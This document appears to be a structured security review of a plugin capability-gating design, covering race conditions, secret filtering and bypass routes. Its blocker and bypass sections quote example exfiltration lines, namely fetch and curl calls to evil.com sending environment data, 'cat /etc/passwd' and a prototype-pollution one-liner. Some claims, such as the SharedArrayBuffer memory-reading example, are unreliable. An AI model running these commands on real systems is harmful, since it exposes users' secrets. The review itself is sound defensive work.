consumer_purpose: Provide capability-gated runtime enforcement for all plugin hook dispatch, tool registration, config exposure, and network access

summary.overall_risk: HIGH — two blockers (TOCTOU in trigger(), no defense-in-depth for in-process bypass) and three warnings (stripSecrets undefined, Effect.promise context loss, event subscriber stale-reference path)

blockers.title: TOCTOU between capability check and hook dispatch in trigger()
blockers.reproduction: Two fibers call trigger('chat.message') concurrently. Fiber A reads s.plugins (line ~290), iterates to plugin X, checks hasCapability → passes. Fiber B concurrently modifies s.plugins (deregisters plugin X). Fiber A then calls yield* Effect.promise(async () => fn(input, output)) — fn now references a Hooks object that may have been disposed. The gap between the capability check and the dispatch is unprotected.
blockers.root_cause: The proposed trigger() reads State once via InstanceState.get() but the per-plugin capability check and subsequent Effect.promise call are separated by a yield point. Effect v4 can interleave at every yield*, so s.plugins could be stale by the time fn() executes.
blockers.fix: Either (a) snapshot s.plugins into a local const at the top of trigger() and iterate the snapshot, or (b) gate each plugin's hook inside a Semaphore.withPermit on a per-plugin lock that also serializes deregistration, or (c) use a Ref (not InstanceState) that provides atomic swap of the entire plugin list so trigger() always sees a consistent snapshot.
blockers.evidence: Current code: InstanceState.get(state) returns the live reference. For...of iterates without synchronization. The proposed after-code preserves this exact pattern. The bus subscriber at lines 272-282 (current code) also reads the same hooks array reference from a forked fiber — proof that concurrent access paths exist.

blockers.title: In-process plugin model provides NO defense-in-depth against bypass — capability gating is purely advisory
blockers.reproduction: A malicious or compromised third-party plugin can: (a) call fs.readFileSync('/home/user/.opencode/config.json') to read all API keys regardless of filesystem.read capability; (b) call fetch('https://evil.com/exfil?data=' + process.env...) despite lacking network.request capability; (c) spawn child_process.exec('curl http://evil.com/steal') using full Node.js API; (d) require('os').userInfo() to enumerate the system; (e) attach to process.on('message') to intercept IPC. None of these go through plugin hooks, so none are gated.
blockers.root_cause: The capability model gates only the plugin SDK surfaces (hook dispatch, tool registration, config field exposure). Plugins execute as full Node.js/Bun modules in-process with unrestricted access to all global APIs. The plan's Gate 4 acknowledges this but defers sandboxing to 'a future phase'.
blockers.fix: Before Phase 2 ships, at minimum: (a) document all known bypass vectors in the capability manifest schema; (b) add runtime hooks that detect and warn on raw Node.js API usage from plugin modules (via Module._resolveFilename wrapping or Bun module hooks); (c) add a restrictive --plugin-sandbox mode that runs plugins in isolated VM contexts with no fs/net/process access. Do not present capability gating as a security boundary without these.
blockers.evidence: Plan's own risk assessment: 'Circumvention via direct Node.js APIs — Likelihood: HIGH, Impact: HIGH — Mitigated via documentation + future sandboxing.' This is explicitly called out as HIGH/HIGH with no concrete mitigation in Phase 1 or 2.

warnings.title: stripSecrets() is undefined — no actual secret filtering logic is designed
warnings.reproduction: The plan says 'stripSecrets(cfg) removes provider API keys, auth tokens, etc.' but provides no implementation, no list of secrets to strip, no configuration schema for identifying secrets. If a config key is added in the future and not added to stripSecrets(), it leaks to all plugins without secrets.read. There is no defense-in-depth: secrets.read is checked at the config gate but a plugin with network access can exfiltrate any config values it received.
warnings.root_cause: The plan defines the gate boundary but not the filter itself. The Config system has no 'sensitive' annotation on individual keys. Without a schema-level annotation (e.g., a ConfigKey.sensitive flag or a well-known path prefix like $sensitive/), stripSecrets must hardcode a blocklist that will inevitably fall out of date.
warnings.fix: Either (a) add a `sensitive?: boolean` field to every config key definition in the Config schema, and derive stripSecrets from that schema; or (b) define a `SENSITIVE_CONFIG_PATHS` constant with JSON path patterns and validate it with a CI check that fails if new keys are added without updating it; or (c) use a Redacted type wrapper (like Effect's Redacted) for all secret values and filter on that type at the config boundary.
warnings.evidence: Current root cause #3: 'PluginInput.config exposes full config object' (HIGH confidence). The plan proposes stripSecrets but the function body is `// TODO` — no second line of defense exists.

warnings.title: Effect.promise in trigger() loses Effect context — capability state could race with context disposal
warnings.reproduction: trigger() uses yield* Effect.promise(async () => fn(input, output)) inside the for loop. Effect.promise creates a new fiber to manage the Promise. The Effect context (FiberRefs, current Scope, current Span) is cloned into this fiber. If the InstanceState scope is being torn down while trigger() is mid-iteration, the cloned fiber survives the scope teardown and executes fn() against a Hooks object that may have been disposed by addFinalizer. With strict concurrency mode, this would be a context leak — the stale fiber would attempt to read from a Scope that no longer exists.
warnings.root_cause: Fire-and-forget via Effect.promise detaches the execution from the parent fiber's lifecycle. The plan's HOOK_CAPABILITY_MAP and capability checks run in the main Effect context, but fn() executes in the bridged context. If fn() itself does Effect operations (e.g., accessing services via Context), those services may have been shut down.
warnings.fix: Replace yield* Effect.promise(async () => fn(...)) with yield* Effect.attemptPromise(() => fn(...)) that preserves the parent context. Or better, wrap each hook call in Effect.ensuring / Effect.onError to propagate results and failures back to the parent fiber. Alternatively, fork each hook call with Effect.fork and join with Fiber.join, so the parent fiber can await all children and handle their results.
warnings.evidence: Analysis of current code: Line 298 uses Effect.promise(async () => fn(input, output)). The plan's proposed After code preserves this exact pattern. Effect.promise does not guarantee context propagation across async boundaries in all Effect v4 configurations.

warnings.title: Bus event subscriber reads hooks via closure, not via InstanceState.get — stale reference risk on re-init
warnings.reproduction: The bus subscriber at lines 272-282 captures the `hooks` array reference by closure during InstanceState initialization: `yield* (yield* bus.subscribeAll()).pipe(Stream.runForEach((input) => Effect.sync(() => { for (const hook of hooks) { ... } }))`. If the InstanceState is invalidated and re-initialized (e.g., the project directory changes or the plugin service is restarted), the bus subscriber's fork is scoped to the OLD InstanceState. But the plan's State restructure introduces a new `plugins` array — if trigger() now reads via InstanceState.get (getting the new array) while the bus subscriber reads via closure (getting the old array), there's an inconsistency window where events are dispatched through old plugin registrations while hooks are dispatched through new ones.
warnings.root_cause: The bus subscriber doesn't go through InstanceState.get() for each event — it captures the local `hooks` reference once at init time. The plan's State restructure preserves this same pattern (the subscriber would capture `plugins` by closure). If the InstanceState is invalidated between two event dispatches, the subscriber misses the new state.
warnings.fix: Change the bus subscriber to yield* InstanceState.get(state) inside the Stream.runForEach callback instead of capturing the hooks reference by closure. This ensures every event dispatch reads the current state. The cost is one InstanceState.get per event, which is a ScopedCache lookup (hash table get — negligible latency).
warnings.evidence: Current lines 272-282: `const hooks: Hooks[] = []` at line 132 (local init), then `yield* (yield* bus.subscribeAll()).pipe(Stream.runForEach((input) => Effect.sync(() => { for (const hook of hooks) { ... } })))` at lines 272-282 — hooks is captured by closure, not re-read from InstanceState.

warnings.title: Plugin deregistration is not designed — the hooks/plugins array grows and never shrinks
warnings.reproduction: The proposed State type changes from `{ hooks: Hooks[] }` to `{ plugins: PluginRegistration[] }`. Neither the current code nor the plan provides any mechanism to remove a plugin from this array after initial registration. If a plugin crashes, is updated, or is explicitly disabled by the user, its hooks continue to fire and its capability entries remain in the array. The addFinalizer at line 258 calls dispose() on each hook, but the hook object reference remains in the array — it's just a stale object. If a plugin is re-registered (e.g., after update), its hooks are appended, not replaced, leading to duplicate entries and double-firing.
warnings.root_cause: The plan doesn't address plugin lifecycle past initial load. There's no deregisterPlugin API, no hook removal logic, and no way to update a plugin's capabilities without restarting the InstanceState (invalidating all state). The plan's risk assessment doesn't list this case.
warnings.fix: Add a `deregister(pluginId)` method to the Interface that filters the plugin out of the `plugins` array. For the proposed State type, this means `s.plugins = s.plugins.filter(p => p.pluginId !== pluginId)`. Use a SynchronizedRef or a Ref of ReadonlyArray for atomic swap. Also add an `updateCapabilities(pluginId, caps)` method for capability updates without full re-init.
warnings.evidence: Current code: No deregister path exists. The plan's State type (proposed `plugins: PluginRegistration[]`) also has no remove mechanism. The addFinalizer at line 258 does dispose individual hooks but doesn't remove them from the array.

warnings.title: Plugin error messages can leak internal paths, secret values, and stack traces to LLM/caller
warnings.reproduction: When a plugin tool throws an error, registry.ts line 282-286 catches it and returns: `output: \`[${id}] Plugin tool error: ${error instanceof Error ? error.message : String(error)}\``. The `error.message` may contain: (a) internal file paths from stack traces; (b) config values that were captured in error messages; (c) sensitive data from the plugin's internal state. This output is returned to the LLM/caller as a tool result. The plan's proposed capability gates don't sanitize error output.
warnings.root_cause: The error catch block at registry.ts:282-286 uses `${error.message}` without sanitization. The plan doesn't add error sanitization gates. A plugin without `secrets.read` could still leak secrets through error messages.
warnings.fix: Add an error sanitization layer in fromPlugin() that strips known sensitive patterns (file paths, URLs containing credentials, Object keys that match secret patterns) before returning the error output. At minimum, run the error message through the same stripSecrets function used for config filtering.
warnings.evidence: Current registry.ts lines 281-287: `Effect.catch((error: unknown) => Effect.succeed({ title: id, metadata: { status: 'error' }, output: \`[${id}] Plugin tool error: ${error instanceof Error ? error.message : String(error)}\` }))`

warnings.title: publishPluginError uses bridge.fork() — fire-and-forget effect that may lose context
warnings.reproduction: publishPluginError() at line 135 calls bridge.fork(bus.publish(...)) inside a non-Effect function context. bridge.fork() detaches the effect from the current scope and runs it independently. If the InstanceState scope is being torn down (e.g., during project switch), this forked effect may reference services (Bus) that are already shut down. The plan does not address error publishing pathways in the capability-gated design.
warnings.root_cause: The function is a regular async helper (not within Effect.gen) that uses bridge.fork to fire-and-forget. Effect v4's structured concurrency is bypassed by design here. If the parent scope is torn down, the forked effect operates on stale Context.
warnings.fix: Either (a) make publishPluginError an Effect function and use Effect.fork in the parent scope; or (b) use Effect.forever or Scope.addFinalizer on the bus subscription to ensure it lives as long as the publisher; or (c) at minimum, wrap the bus.publish in Effect.catchAll to handle post-shutdown errors gracefully.
warnings.evidence: Current code lines 135-137: `function publishPluginError(message: string) { bridge.fork(bus.publish(Session.Event.Error, { error: new NamedError.Unknown({ message }).toObject() })) }`

warnings.title: The `seen` Set in getLegacyPlugins grows without bound
warnings.reproduction: The `seen` Set at line 96 accumulates every plugin module object ever passed to getLegacyPlugins. Since it's module-scoped (`const seen = new Set<unknown>()` at line 96), it lives for the entire process lifetime. If plugins are loaded dynamically across many InstanceState instances (e.g., each project has different plugins), the set grows unbounded. While the number of distinct plugin modules is practically bounded by total npm installs, the type is `Set<unknown>` with no eviction policy.
warnings.root_cause: This is a pre-existing debt — the Set deduplicates legacy plugin registrations to prevent double-processing on re-init. The plan doesn't refactor or remove it. It's a minor leak but establishes a pattern of module-scoped mutable state.
warnings.fix: Move `seen` into the InstanceState.make closure so it's scoped per instance key. Or replace it with a WeakSet keyed on the module object so entries are garbage-collected when modules are no longer referenced.
warnings.evidence: Current code line 96: `const seen = new Set<unknown>()` at module scope. Used at line 100: `if (seen.has(mod)) return []` / `seen.add(mod)` at line 103.

warnings.title: log.warn in proposed trigger() exposes pluginId which may be an internal path
warnings.reproduction: The plan's proposed trigger() calls `log.warn('plugin hook denied', { pluginId: reg.pluginId, hook: name, required })`. The pluginId could be: (a) a filesystem path for file-based plugins; (b) an npm package name that reveals internal naming conventions; (c) a UUID that can be correlated with other logs. The `hook: name` field reveals internal hook names that may match internal product feature names. These logs are written to whatever transport the logger uses, potentially including desktop telemetry.
warnings.root_cause: The plan doesn't specify log redaction for the capability enforcement path. The logger writes to stdout/stderr by default and may be captured by telemetry.
warnings.fix: Sanitize pluginId before logging — use a short display name or a hash. Don't log hook names verbatim in production paths. Consider using Effect's structured logging with redaction levels.
warnings.evidence: Plan's proposed After code for Gate 1: `log.warn('plugin hook denied', { pluginId: reg.pluginId, hook: name, required })`

verified_safe: InstanceState.make uses ScopedCache with capacity: INFINITY — no cache eviction race on hot re-reads; all callers of get() see the same cached state object
No let/var module-scope state in plugin/index.ts — every module-scope binding is const (except the `seen` Set at line 96)
Plugin tool registration in registry.ts does not mutate custom[] after InstanceState.make returns — all push() calls happen during initialization
addFinalizer at line 258 correctly disposes all hooks when InstanceState scope closes — Effect.addFinalizer is guaranteed to run on both success and error paths
Effect.forkScoped at line 281 ensures the bus subscriber fiber is interrupted when the parent scope closes — no orphaned event subscribers
Internal plugins (internalPlugins()) are directly imported modules — no dynamic import, no capability bypass possible because they share process memory with the host
Plugin loader (loader.ts) allocates no scoped resources — pure async/await with no Effect/Scope patterns, no leak paths
Deterministic plugin loading order via sequential for loops — no concurrent init that could cause capability registration races
The plan correctly identifies that this is a design-phase document — no code has been committed yet, so all findings are about the design, not the implementation

bypass_analysis.summary: The capability-gated runtime gates only 5 SDK surfaces but does NOT prevent a plugin from using raw Node.js/Bun APIs to bypass all gates entirely. This is a design-scope limitation, not an implementation gap.

attacks_not_prevented.attack: Direct filesystem access via fs.readFileSync / Bun.file() / require('child_process').exec('cat /etc/passwd')
attacks_not_prevented.why_not_prevented: filesystem.read capability only gates tool hooks. Plugin code that runs at module load time (top-level await) or in any callback that's not a hook can call fs directly.

attacks_not_prevented.attack: Network exfiltration via fetch() / http.request / WebSocket / child_process.exec('curl')
attacks_not_prevented.why_not_prevented: network.request gates only SDK-intercepted calls. Raw fetch() and Node.js http are fully accessible. The plan admits this and defers to 'future sandboxing'.

attacks_not_prevented.attack: Config/proc/env exfiltration via process.env / os.userInfo() / require('child_process').exec('env')
attacks_not_prevented.why_not_prevented: No capability gates environment or system information access. shell.env gates only the hook, not direct process.env access.

attacks_not_prevented.attack: Process manipulation — signal handlers, worker threads, process.exit, uncaughtException handlers
attacks_not_prevented.why_not_prevented: No capability gates process-level APIs. A plugin can register process.on('uncaughtException') to suppress errors, or process.exit() to crash the host.
attacks_not_prevented.example: process.on('message', (msg) => { if (msg.type === 'secret') fetch('https://evil.com', { method: 'POST', body: msg.data }) })

attacks_not_prevented.attack: Dynamic require/inject — loading additional modules at runtime that were not in the capability manifest
attacks_not_prevented.why_not_prevented: require() and import() are unrestricted at the in-process level. A plugin can dynamically load any npm package at runtime.
attacks_not_prevented.example: const ss = require('source-map-support'); ss.install({ hookRequire: true, ... })

attacks_not_prevented.attack: Shared memory / side-channel attacks — reading memory of other plugins or the host process
attacks_not_prevented.why_not_prevented: SharedArrayBuffer and SharedArrayBuffer are accessible. A plugin can read memory used by other plugins in the same process.
attacks_not_prevented.example: const sab = new SharedArrayBuffer(1024); const view = new Uint8Array(sab); // read adjacent memory

attacks_not_prevented.attack: prototype pollution to bypass capability checks
attacks_not_prevented.why_not_prevented: hasCapability() implementation is not specified. If it does (caps as Set).has(id), prototype pollution on the Set or the array could bypass the check.
attacks_not_prevented.example: Object.prototype.has = () => true; // makes every hasCapability call return true

bypass_analysis.recommendation: Explicitly document in the capability manifest schema: 'This capability model is an SDK-level gate only. It does NOT provide a security sandbox. Plugins run in-process with full host API access.' Rename the plan's title from 'Security Manifest' to 'Permission Manifest' to set accurate expectations. Ship sandboxing (subprocess isolation, VM.Compartment, or Bun native sandbox) as a Phase 3 requirement before opening a public plugin marketplace.

key_diagrams_reference.trigger_toctou_timeline: Fiber A: InstanceState.get(state) → read s.plugins[0] → hasCapability(pass) → yield* Effect.promise(...) ║ Fiber B: deregisterPlugin(X) → s.plugins.splice(i,1) → hooks[i].dispose() ║ [now Fiber A runs fn() on disposed hooks object]
key_diagrams_reference.bus_subscriber_stale_ref: InstanceState.init → const hooks = [] → hook.push(...) → return {hooks} ║ Bus subscriber captures `hooks` by closure ║ InstanceState.invalidate → new init → new `hooks` array ║ Bus subscriber still reads OLD hooks array via closure
key_diagrams_reference.config_filter_bypass: Config: { apiKey: 'sk-xxx', provider: 'openai' } → PluginInput.config for plugin w/o secrets.read → stripSecrets(cfg) → result: { provider: 'openai' } ║ Plugin can still: fetch('https://evil.com/log', { method: 'POST', body: 'key=' + apiKey }) ║ (apiKey was stripped, so only provider leaks, but: if stripSecrets misses a new key, it leaks)
